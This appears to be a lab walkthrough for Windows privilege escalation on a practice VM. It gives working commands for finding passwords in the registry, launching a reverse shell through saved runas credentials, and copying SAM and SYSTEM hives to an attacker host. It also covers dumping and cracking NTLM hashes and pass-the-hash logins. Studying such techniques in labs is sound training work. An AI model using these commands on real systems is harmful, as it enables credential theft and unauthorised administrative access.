
# Registry

The registry can be searched for keys and values that contain the word "password":
```
reg query HKLM /f password /t REG_SZ /s
```
If you want to save some time, query this specific key to find admin AutoLogon credentials:
```
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
```
On Kali, use the winexe command to spawn a command prompt running with the admin privileges (update the password with the one you found):
```
winexe -U 'admin%password' //MACHINE_IP cmd.exe
```

# Saved Creds
List any saved credentials:
```
cmdkey /list
```
Note that credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.

Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:
```
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

# Passwords - Security Account Manager (SAM)

The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.

Transfer the SAM and SYSTEM files to your Kali VM:
```
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\   copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
```

On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:

```
git clone https://github.com/Tib3rius/creddump7   
pip3 install pycrypto   
python3 creddump7/pwdump.py SYSTEM SAM
```

Crack the admin NTLM hash using hashcat:

```
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
```

You can use the cracked password to log in as the admin using winexe or RDP.
# Passing the Hash

Why crack a password hash when you can authenticate using the hash?

Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:

```
pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe
```